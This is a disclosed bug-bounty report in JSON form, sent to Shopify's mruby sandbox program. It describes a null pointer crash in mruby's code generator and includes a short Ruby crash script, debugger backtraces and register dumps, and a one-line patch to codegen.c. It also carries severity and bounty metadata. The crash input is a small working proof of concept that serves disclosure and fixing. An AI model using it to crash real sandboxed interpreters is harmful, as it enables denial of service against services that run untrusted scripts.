{
  "reported_to": "shopify-scripts",
  "reported_by": "haquaman ",
  "title": "Null pointer derefence due to bug in codegen with negation without using value",
  "content": "\nCrash file is:\nCode 37 Bytes\n1p *case\n2  when nil\n3    -0\n4    nil\n5end\nCode 98 Bytes\n1$ ./dev/bin/mruby crash.rb\n2crash.rb:1:3: '*' interpreted as argument prefix\n3Segmentation fault: 11\nCode 2.19 KiB\n1$ lldb ./dev/bin/mruby crash.rb\n2(lldb) target create \"./dev/bin/mruby\"\n3Current executable set to './dev/bin/mruby' (x86_64).\n4(lldb) settings set -- target.run-args  \"crash.rb\"\n5(lldb) r\n6Process 5638 launched: './dev/bin/mruby' (x86_64)\n7crash.rb:1:3: '*' interpreted as argument prefix\n8Process 5638 stopped\n9* thread #1: tid = 0x85b9d00, 0x000000010000278b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)\n10    frame #0: 0x000000010000278b mruby`ary_concat + 27\n11mruby`ary_concat:\n12->  0x10000278b <+27>: movl   0x18(%rdx), %ecx\n13    0x10000278e <+30>: addl   -0x1c(%rbp), %ecx\n14    0x100002791 <+33>: movl   %ecx, -0x20(%rbp)\n15    0x100002794 <+36>: movq   -0x8(%rbp), %rdi\n16(lldb) bt\n17* thread #1: tid = 0x85b9d00, 0x000000010000278b mruby`ary_concat + 27, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x18)\n18  * frame #0: 0x000000010000278b mruby`ary_concat + 27\n19    frame #1: 0x0000000100002766 mruby`mrb_ary_concat + 70\n20    frame #2: 0x000000010004451f mruby`mrb_vm_exec + 25439\n21    frame #3: 0x000000010003e1a7 mruby`mrb_vm_run + 135\n22    frame #4: 0x0000000100046604 mruby`mrb_top_run + 100\n23    frame #5: 0x0000000100071adf mruby`load_exec + 1183\n24    frame #6: 0x0000000100071623 mruby`mrb_load_file_cxt + 67\n25    frame #7: 0x00000001000017d8 mruby`main + 904\n26    frame #8: 0x00007fff8a9db5ad libdyld.dylib`start + 1\n27(lldb) register read\n28General Purpose Registers:\n29       rax = 0x000000010100f030\n30       rbx = 0x0000000000000000\n31       rcx = 0x0000000000000000\n32       rdx = 0x0000000000000000\n33       rdi = 0x0000000100300390\n34       rsi = 0x0000000000000000\n35       rbp = 0x00007fff5fbfca00\n36       rsp = 0x00007fff5fbfc9e0\n37        r8 = 0x0000000000000000\n38        r9 = 0x000000000000010e\n39       r10 = 0x0000000000000002\n40       r11 = 0x0000000000f83160\n41       r12 = 0x0000000000000000\n42       r13 = 0x0000000000000000\n43       r14 = 0x0000000000000000\n44       r15 = 0x0000000000000000\n45       rip = 0x000000010000278b  mruby`ary_concat + 27\n46    rflags = 0x0000000000010202\n47        cs = 0x000000000000002b\n48        fs = 0x0000000000000000\n49        gs = 0x0000000000000000\n50\n51(lldb) q\n52Quitting LLDB will kill one or more processes. Do you really want to proceed: [Y/n] y\n53\nCode 2.43 KiB\n1$ ./bin/sandbox crash.rb\n2./bin/sandbox:20: [BUG] Segmentation fault at 0x00000000000018\n3ruby 2.3.0p0 (2015-12-25 revision 53290) [x86_64-darwin15]\n4\n5-- Crash Report log information --------------------------------------------\n6   See Crash Report log file under the one of following:\n7     * ~/Library/Logs/CrashReporter\n8     * /Library/Logs/CrashReporter\n9     * ~/Library/Logs/DiagnosticReports\n10     * /Library/Logs/DiagnosticReports\n11   for more details.\n12Don't forget to include the above Crash Report log file in bug reports.\n13\n14-- Control frame information -----------------------------------------------\n15c:0003 p:---- s:0011 e:000010 CFUNC  :sandbox_eval\n16c:0002 p:0214 s:0006 E:001c70 EVAL   ./bin/sandbox:20 [FINISH]\n17c:0001 p:0000 s:0002 E:001b60 (none) [FINISH]\n18\n19-- Ruby level backtrace information ----------------------------------------\n20./bin/sandbox:20:in `<main>'\n21./bin/sandbox:20:in `sandbox_eval'\n22\n23-- Machine register context ------------------------------------------------\n24 rax: 0x0000000104c7c120 rbx: 0x0000000104cd3c28 rcx: 0x0000000000000003\n25 rdx: 0x0000000104c7c120 rdi: 0x0000000104c74440 rsi: 0x0000000000000000\n26 rbp: 0x00007fff5b9daf50 rsp: 0x00007fff5b9daf20  r8: 0x0000000000000000\n27  r9: 0x0000000104c75d60 r10: 0x0000000104c86a88 r11: 0x0000000000000020\n28 r12: 0x0000000104c74460 r13: 0x0000000000000000 r14: 0x0000000000000000\n29 r15: 0x0000000000000000 rip: 0x0000000104b4e97d rfl: 0x0000000000010206\n30\n31-- C level backtrace information -------------------------------------------\n320   ruby                                0x00000001043c15d4 rb_vm_bugreport + 388\n331   ruby                                0x0000000104263023 rb_bug_context + 483\n342   ruby                                0x0000000104336653 sigsegv + 83\n353   libsystem_platform.dylib            0x00007fff9826d52a _sigtramp + 26\n364   mruby_engine.bundle                 0x0000000104b4e97d mrb_ary_concat + 29\n375   ???                                 0x0000000104c74440 0x0 + 4375135296\n38\n39-- Other runtime information -----------------------------------------------\n40\n41* Loaded script: ./bin/sandbox\n42\n43* Loaded features:\n44\n45    0 enumerator.so\n46    1 thread.rb\n47    2 rational.so\n48    3 complex.so\n49<snip various gems>\n50  185 /Users/<snip>/mruby-engine/lib/mruby_engine/mruby_engine.bundle\n51  186 /Users/<snip>/mruby-engine/lib/mruby_engine.rb\n52\n53[NOTE]\n54You may have encountered a bug in the Ruby interpreter or extension libraries.\n55Bug reports are welcome.\n56For details: http://www.ruby-lang.org/bugreport.html\n57\n58Abort trap: 6\n59\nPatch to fix is:\nCode 408 Bytes\n1diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c\n2index 553baa1..5ddf988 100644\n3--- a/mrbgems/mruby-compiler/core/codegen.c\n4+++ b/mrbgems/mruby-compiler/core/codegen.c\n5@@ -2256,7 +2256,7 @@ codegen(codegen_scope *s, node *tree, int val)\n6             }\n7             genop(s, co);\n8           }\n9-          push();\n10+          if (val) push();\n11         }\n12         break;\n13 \nHope that helps!\nCheers,\nHugh\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 10000,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1482023280,
  "report_url": "https://hackerone.com/reports/187536",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}